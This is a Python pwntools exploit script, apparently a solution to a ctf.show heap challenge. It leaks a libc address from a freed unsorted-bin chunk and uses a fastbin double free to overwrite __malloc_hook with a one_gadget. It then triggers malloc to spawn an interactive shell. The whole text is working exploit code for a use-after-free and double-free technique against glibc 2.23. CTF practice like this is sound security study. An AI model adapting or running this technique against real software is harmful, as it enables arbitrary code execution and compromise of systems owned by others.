from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28256)
elf = ELF("./pwn")
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
menu = "Input your choice:"
def add(size, content, lenth):
    io.recvuntil(menu)
    io.sendline('1')
    io.recvuntil("Please input the size of the flag\n")
    io.sendline(str(size))
    io.recvuntil("please input the flag name:\n")
    io.send(content)
    io.recvuntil("please input the flag idx:\n")
    io.sendline(lenth)
def delete(index):
    io.recvuntil(menu)
    io.sendline('4')
    io.recvuntil("Please input the index:\n")
    io.sendline(str(index))
def show(index):
    io.recvuntil(menu)
    io.sendline('2')
    io.recvuntil("Please input the index:\n")
    io.sendline(str(index))
add(0x80, 'chunk0\n', '123')#0
add(0x68, 'chunk1\n', '123')#1
add(0x68, 'chunk2\n', '123')#2
add(0x68, '/bin/sh\n', '123')#3
delete(0)
show(0)
io.recvuntil("name:\n")
malloc_hook = u64(io.recvuntil('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
realloc = libc_base + libc.sym['realloc']
one_gadget = libc_base + 0xf1147
delete(1)
delete(2)
delete(1)
add(0x68, p64(malloc_hook-0x23)+'\n', '123')#3
add(0x68, p64(malloc_hook-0x23)+'\n', '123')#4
add(0x68, p64(malloc_hook-0x23)+'\n', '123')#5
payload = 'a'*(0x13-8) + p64(one_gadget) + p64(realloc)
add(0x68, payload+'\n', '123')#4
io.recvuntil(menu)
io.sendline('1')
io.interactive()
